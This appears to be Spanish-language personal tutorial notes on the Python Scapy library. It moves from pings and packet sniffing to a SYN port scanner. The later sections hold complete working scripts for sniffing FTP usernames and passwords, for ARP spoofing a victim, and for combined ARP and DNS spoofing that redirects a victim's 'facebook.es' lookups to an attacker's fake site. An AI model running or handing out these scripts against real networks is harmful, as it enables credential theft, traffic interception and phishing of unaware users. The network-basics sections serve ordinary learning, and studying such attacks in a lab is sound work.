Scapy es una librería poderosa de Python que permite manipular paquetes de red de manera sencilla. Puedes usarla para capturar, construir, enviar, recibir y analizar paquetes de red. A continuación te presento algunos usos básicos de Scapy. Lo primero será instalar winpcap para poder usar scapy sin problema:
```python
https://npcap.com/
```
![[Pasted image 20240527210055.png]]
Lo instalamos:
![[Pasted image 20240527210139.png]]
## LANZAMOS UN PING
Para lanzar un ping y analizar la respuesta, lo haremos de la siguiente forma:

1. **Crear el paquete**:
    - `IP(dst=ip_destino)`: Crea un paquete IP con la dirección de destino especificada.
    - `/ICMP()`: Añade un paquete ICMP Echo Request (ping) al paquete IP.

2. **Enviar el paquete**:
    - `sr1(paquete, timeout=2)`: Envía el paquete y espera la primera respuesta. El parámetro `timeout` especifica el tiempo en segundos para esperar una respuesta.

```python
from scapy.all import IP, ICMP, send, sr1

packet = IP(dst="8.8.8.8") # Creamos un paquete IP

packet = IP(dst="8.8.8.8")/ICMP()  # Añadimos una cama ICMP al paquete IP

send(packet)  # Envía el paquete IP/ICMP

response = sr1(packet)

if response:
    response.show()
else:
    print("No se recibió respuesta")
```
![[Pasted image 20240527210536.png]]
## SNIFFING CON PYTHON
Podemos capturar un número determinado de paquetes haciendo sniffing:
```python
from scapy.all import sniff

packets = sniff(filter="tcp", count=10)  # Captura 10 paquetes TCP
packets.show()
```
![[Pasted image 20240531102847.png]]
**Analizar paquetes FTP**
Podemos hacer sniffing solo del tráfico FTP:
```python
from scapy.all import *

# Captura 10 paquetes FTP (puertos 20 y 21)
packets = sniff(filter="tcp port 21 or tcp port 20", count=99999)

# Mostrar los paquetes capturados
for packet in packets:
    packet.show()
```
Podemos interceptar credenciales haciendo sniffing de por ejemplo el protocolo FTP:
```python
from scapy.all import *

def extract_ftp_credentials(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        if 'USER' in payload or 'PASS' in payload:
            print(payload.strip())

# Captura 10 paquetes FTP (puertos 20 y 21)
packets = sniff(filter="tcp port 21", count=9999)

# Extraer y mostrar los campos de usuario y contraseña
for packet in packets:
    extract_ftp_credentials(packet)
```
![[Pasted image 20240531103448.png]]
O podemos complicar un poco el código:

- if paquete.haslayer(TCP) -> Verifica si el paquete tiene una capa TCP.
- if tcp_layer.dport == 21 or tcp_layer.sport == 21 -> Filtra por el puerto FTP, dport destination y sport source.
- datos = bytes(tcp_layer.payload).decode('utf-8', errors='ignore') -> Convierte los datos del paquete en una cadena de texto.
- store=0 -> No almacena paquetes en memoria

```python
from scapy.all import sniff, TCP

def mostrar_paquete(paquete):
    if paquete.haslayer(TCP):
        tcp_layer = paquete.getlayer(TCP)
        if tcp_layer.dport == 21 or tcp_layer.sport == 21:
            datos = bytes(tcp_layer.payload).decode('utf-8', errors='ignore')
            if "USER" in datos or "PASS" in datos:
	                print(f"Paquete FTP Capturado: {paquete.summary()}")
	                print(f"Datos: {datos.strip()}")

sniff(iface="eth0", prn=mostrar_paquete, filter="tcp port 21", store=0)
```
![[Pasted image 20240527212048.png]]
**Consultar la MAC de una IP**
Podemos conocer la MAC de cualquiera de las IPs que se encuentren en nuestra red:
```python
from scapy.all import ARP, Ether, srp

def get_mac(ip):
    # Crear una solicitud ARP
    arp_request = ARP(pdst=ip)
    # Crear un marco Ethernet para envolver la solicitud ARP
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    # Combinar el marco Ethernet con la solicitud ARP
    arp_request_packet = ether/arp_request

    # Enviar el paquete ARP y obtener la respuesta
    result = srp(arp_request_packet, timeout=2, verbose=False)[0]

    # Verificar si se recibió una respuesta
    if result:
        # Obtener la dirección MAC de la respuesta
        return result[0][1].hwsrc
    else:
        return None

# Ejemplo de uso
ip_address = '192.168.0.44'  # Reemplaza con la dirección IP que deseas consultar
mac_address = get_mac(ip_address)

if mac_address:
    print(f'La dirección MAC de {ip_address} es {mac_address}')
else:
    print(f'No se pudo encontrar la dirección MAC de {ip_address}')
```
![[Pasted image 20240531163603.png]]
**Detectar equipos disponibles en mi red**
```python
from scapy.all import *
from netaddr import IPNetwork

def discover_hosts(network):
    alive_hosts = []
    try:
        for ip in IPNetwork(network):
            print(f"Escaneando IP: {ip}")
            pkt = IP(dst=str(ip))/ICMP()
            response = sr1(pkt, timeout=1, verbose=0)
            if response:
                print(f"Host activo encontrado: {ip}")
                alive_hosts.append(str(ip))
    except KeyboardInterrupt:
        print("\nEscaneo interrumpido por el usuario.")
    
    return alive_hosts

if __name__ == "__main__":
    network = "192.168.0.0/24"
    alive_hosts = discover_hosts(network)
    
    if alive_hosts:
        print("Hosts activos en la red:")
        for host in alive_hosts:
            print(host)
    else:
        print("No se encontraron hosts activos en la red.")
```


**Escanear Puertos con Python**
Podemos también hacer un escaneo de puertos con python usando scapy:
```python
from scapy.all import *

def scan_ports(target_ip, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port+1):
        pkt = IP(dst=target_ip)/TCP(dport=port, flags='S')
        response = sr1(pkt, timeout=1, verbose=0)
        
        if response:
            if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
                open_ports.append(port)
                sr(IP(dst=target_ip)/TCP(dport=port, flags='R'), timeout=1, verbose=0)
    
    return open_ports

if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Cambia esto por la IP que quieras escanear
    start_port = 1
    end_port = 1024

    open_ports = scan_ports(target_ip, start_port, end_port)
    
    if open_ports:
        print(f"Puertos abiertos en {target_ip}: {open_ports}")
    else:
        print(f"No se encontraron puertos abiertos en {target_ip} en el rango {start_port}-{end_port}.")
```
![[Pasted image 20240531163825.png]]
## ARP SPOOFING

```python
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf

# Configura la IP del objetivo y la IP del remitente
objetivo = "192.168.0.19"  # Dirección IP del objetivo
gateway_ip = "192.168.0.1"  # Dirección IP del gateway (router)

# Obtiene la interfaz de red por defecto
interfaz_red = conf.iface

# Obtiene la dirección MAC de la interfaz de red
source_mac = get_if_hwaddr(interfaz_red)

# Configura la solicitud ARP (ARP Response) para spoofing
arp_response = ARP(
    pdst=objetivo,
    hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast MAC para asegurarse de que se recibe
    psrc=gateway_ip,
    hwsrc=source_mac  # Dirección MAC de la interfaz de red
)

# Envuelve el paquete ARP en un paquete Ethernet
paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_response

# Envía los paquetes ARP en un bucle continuo
try:
    print(f"[+] Iniciando ARP spoofing en {objetivo} en la red {gateway_ip}")
    sendp(paquete_arp, iface=interfaz_red, loop=1, inter=0.5)  # Enviar un paquete cada 0.5 segundos
except KeyboardInterrupt:
    print("\n[+] Spoofing terminado.")
```
Aquí vemos como primero no hay ARP Spoofing pero después la máquina víctima pasa por nuestra máquina atacante (que tiene la IP 192.168.0.28):
![[Pasted image 20240531110615.png]]
## DNS y ARP SPOOFING

```python
from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSRR, IP, UDP
import time
import sys

# Variables
objetivo_ip = '192.168.0.34'
gateway_ip = '192.168.0.1'
atacante_ip = '192.168.0.28'

# Obtener la dirección MAC de una IP
def obtener_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in response:
        return received[Ether].src
    return None

# Enviar paquetes ARP falsos
def arp_spoof(objetivo_ip, gateway_ip):
    mac_victima = obtener_mac(objetivo_ip)
    gateway_mac = obtener_mac(gateway_ip)
    
    if not mac_victima or not gateway_mac:
        print("No se pudo obtener la dirección MAC. Saliendo...")
        sys.exit(1)
    
    print("Iniciando ARP spoofing y captura de paquetes DNS...")

    try:
        while True:
            # Enviar paquetes ARP falsos
            send(ARP(op=2, pdst=objetivo_ip, psrc=gateway_ip, hwsrc=gateway_mac, hwdst=mac_victima), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=objetivo_ip, hwsrc=mac_victima, hwdst=gateway_mac), verbose=False)

            # Capturar paquetes DNS
            sniff(filter="udp port 53", prn=dns_spoof, store=0, count=1)

            # Esperar antes de enviar los próximos paquetes ARP
            time.sleep(1)
    except KeyboardInterrupt:
        print("ARP spoofing detenido.")
        sys.exit(0)

# Redirigir solicitudes DNS a mi web falsa
def dns_spoof(paquete):
    if paquete.haslayer(DNS) and paquete.getlayer(DNS).qr == 0:  # Si es una solicitud DNS
        if b"facebook.es" in paquete[DNS].qd.qname:  # Si la solicitud es para 'facebook.es'
            print(f"Interceptado {paquete[IP].src} solicitando {paquete[DNS].qd.qname}")

            spoofed_packet = IP(dst=paquete[IP].src, src=paquete[IP].dst) / \
                             UDP(dport=paquete[UDP].sport, sport=paquete[UDP].dport) / \
                             DNS(id=paquete[DNS].id, qr=1, aa=1, qd=paquete[DNS].qd,
                                 an=DNSRR(rrname=paquete[DNS].qd.qname, ttl=10, rdata=atacante_ip))
            
            send(spoofed_packet, verbose=False)
            print(f"Redirigiendo a {atacante_ip}")

# Iniciar ARP spoofing y captura de paquetes DNS
arp_spoof(objetivo_ip, gateway_ip)
```
